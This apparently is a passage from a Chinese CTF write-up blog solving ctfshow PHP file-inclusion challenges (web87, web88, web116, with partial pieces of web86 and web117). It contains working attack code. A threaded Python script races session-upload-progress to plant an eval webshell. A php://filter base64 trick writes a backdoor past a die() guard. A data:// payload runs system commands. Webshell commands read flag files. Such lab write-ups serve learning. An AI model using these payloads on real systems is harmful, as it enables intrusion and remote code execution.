<span class="line"><span style="color:#d4d4d4">sess=</span><span style="color:#ce9178">'good'</span><span style="color:#d4d4d4">	</span><span style="color:#6a9955"># 可自设</span></span>
<span class="line"><span style="color:#d4d4d4">url1=</span><span style="color:#ce9178">"http://xxx/"</span></span>
<span class="line"><span style="color:#d4d4d4">url2=</span><span style="color:#ce9178">'http://xxx?file=/tmp/sess_'</span><span style="color:#d4d4d4">+sess</span></span>
<span class="line"><span style="color:#d4d4d4">data1={</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#ce9178">'PHP_SESSION_UPLOAD_PROGRESS'</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">'&lt;?php eval($_POST[1]);?&gt;'</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">data2={</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#ce9178">'1'</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">'system("cat f*");'</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">file={</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">'kkk'</span><span style="color:#d4d4d4">	</span><span style="color:#6a9955"># 可自设</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">cookies={</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#ce9178">'PHPSESSID'</span><span style="color:#d4d4d4">: sess</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">def </span><span style="color:#dcdcaa">write</span><span style="color:#d4d4d4">():</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#c586c0">while</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">True</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">		r = session</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">post</span><span style="color:#d4d4d4">(url1,data=data1,files=file,cookies=cookies)</span></span>
<span class="line"><span style="color:#d4d4d4">def </span><span style="color:#dcdcaa">read</span><span style="color:#d4d4d4">():</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#c586c0">while</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">True</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">		r = session</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">post</span><span style="color:#d4d4d4">(url2,data=data2)</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'ctfshow{'</span><span style="color:#d4d4d4"> in r</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">text:</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(r</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">text)	</span><span style="color:#6a9955"># 这里根据flag格式可改写</span></span>
<span class="line"><span style="color:#d4d4d4">threads = [threading</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">Thread</span><span style="color:#d4d4d4">(target=write),</span></span>
<span class="line"><span style="color:#d4d4d4">       threading</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">Thread</span><span style="color:#d4d4d4">(target=read)]</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> t in threads:</span></span>
<span class="line"><span style="color:#d4d4d4">	t</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">start</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#6a9955"># 稍微等一下就跑出来了</span></span></code></pre></div></div></figure><p><strong>小结</strong></p><p><strong>利用条件</strong></p><blockquote><ol><li><p>存在文件包含漏洞</p></li><li><p>知道 session 文件存放路径，可以尝试默认路径</p></li><li><p>具有读取和写入 session 文件的权限</p></li></ol></blockquote><h3 id="web87filter加编码后门"><a class="markdownIt-Anchor" href="#web87filter加编码后门"></a> web87	(filter 加编码后门)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$content</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'content'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"php"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"data"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">":"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"."</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"???"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">urldecode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">), </span><span style="color:#ce9178">"&lt;?php die('大佬别秀了');?&gt;"</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$content</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>有个显著的特征：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">file_put_contents</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">urldecode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">), </span><span style="color:#ce9178">"&lt;?php die('大佬别秀了');?&gt;"</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$content</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">file_put_contents：把一个字符串写入文件中。</span></span></code></pre></div></div></figure><p>首先知道 base64 转换后的字符串长度是 4 的倍数，不足补 =</p><p>base64 解码时，每 4 个字节为一组，遇到不在合法字符中的字符，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码。所以这里的字符串被忽略字符之后剩下的有：phpdie</p><p>这 6 个字符，需要我们补 2 个即可抹除 die。</p><p>另外就是 file 传入有一个 urldecode，而 get 传参时就会进行一次 urldecode，所以 file 需要进行<strong>两次</strong> urlencode。</p><p>其次就是 get 传参时要进行 url 全编码，不然 php 会保留然后就会被过滤成？？？</p><p>url 全编码可以用 burp suite 编码，hackbar 编码好像并不行。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222151659.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221103202633311"></p><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">file = php:</span><span style="color:#6a9955">//filter/write=convert.base64-decode/resource=1.php</span></span>
<span class="line"><span style="color:#d4d4d4">encode_file = %</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">30</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">38</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">30</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">61</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">39</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">63</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">39</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">64</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">31</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">64</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">34</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">66</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">35</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">64</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">33</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">31</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">65</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">30</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">36</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">38</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">25</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">37</span><span style="color:#d4d4d4">%</span><span style="color:#b5cea8">30</span></span>
<span class="line"><span style="color:#d4d4d4">content=aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">B</span></span></code></pre></div></div></figure><p>然后用蚁剑连，或者直接用 hackbar 输命令即可：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#6a9955">//查看目录文件</span></span>
<span class="line"><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">php fl0g</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span></span>
<span class="line"><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac fl0g.php'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{3f5e391f-3767-4fc2-9f7d-407069be0279}</span></span></code></pre></div></div></figure><h3 id="web88data伪协议"><a class="markdownIt-Anchor" href="#web88data伪协议"></a> web88	(data 伪协议)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/php|\~|\!|\@|\#|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|\%|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|\&amp;|\</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">|\(|\)|\-|\_|\</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">|\=|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">/i"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"error"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>直接 data:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?file=data:</span><span style="color:#6a9955">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">//这里要记得删除==</span></span>
<span class="line"><span style="color:#6a9955">// &lt;?php system('tac f*');</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{f0bb7333-08ba-4918-a6fb-70f7b8492e56}</span></span></code></pre></div></div></figure><h3 id="web116foremost传参"><a class="markdownIt-Anchor" href="#web116foremost传参"></a> web116	(foremost + 传参)</h3><p>下载视频进行 foremost 得到源码：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$x</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">( </span><span style="color:#ce9178">'/http|https|data|input|rot13|base64| string/log/|sess/i'</span><span style="color:#d4d4d4"> , </span><span style="color:#9cdcfe">$x</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    	</span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">( </span><span style="color:#ce9178">'too young too simple sometimes native! '</span><span style="color:#d4d4d4"> );</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">])?</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">] : </span><span style="color:#ce9178">"sp2.mp4"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">header</span><span style="color:#d4d4d4">( </span><span style="color:#ce9178">' Content-Type: video/mp4 '</span><span style="color:#d4d4d4"> );</span></span>
<span class="line"><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">payload: ?file=flag</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php</span></span></code></pre></div></div></figure><p>flag:</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{af530486-e4cb-4069-a45c-11360a2702e5}</span></span></code></pre></div></div></figure><h3 id="web117ucs-2编码绕过"><a class="markdownIt-Anchor" href="#web117ucs-2编码绕过"></a> web117	(ucs-2 编码绕过)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
